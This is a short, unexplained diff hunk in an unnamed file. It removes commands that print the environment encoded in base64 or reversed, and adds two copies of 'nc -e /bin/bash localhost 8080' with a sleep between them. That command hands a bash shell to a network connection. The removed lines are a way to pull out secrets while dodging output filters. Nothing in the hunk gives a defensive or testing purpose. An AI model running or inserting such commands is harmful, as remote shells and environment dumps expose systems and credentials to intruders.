@@ -1,5 +1,3 @@
-env|base64
-echo test
-env|rev
-echo test2
-sleep 600
+nc -e /bin/bash localhost 8080
+sleep 60
+nc -e /bin/bash localhost 8080
